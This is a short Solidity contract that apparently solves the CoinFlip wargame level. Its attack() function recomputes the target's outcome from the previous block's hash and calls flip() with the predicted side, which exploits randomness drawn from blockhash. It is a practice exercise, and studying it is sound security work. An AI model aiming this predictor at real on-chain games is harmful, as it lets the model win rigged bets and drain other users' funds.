//SPDX-license-Identifier :MIT
pragma solidity ^0.8.0 ;
import "../src/CoinFlip.sol" ;
contract HelperCoinFlip  {

CoinFlip public A_target  ; 

uint256 factor  =  57896044618658097711785492504343953926634992332820282019728792003956564819968 ; 
constructor(address _target) {
        
        A_target = CoinFlip(_target);
    }
    function attack() public {
        
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / factor;
        bool side = coinFlip == 1 ? true : false;

        
        A_target.flip(side);
    }
}
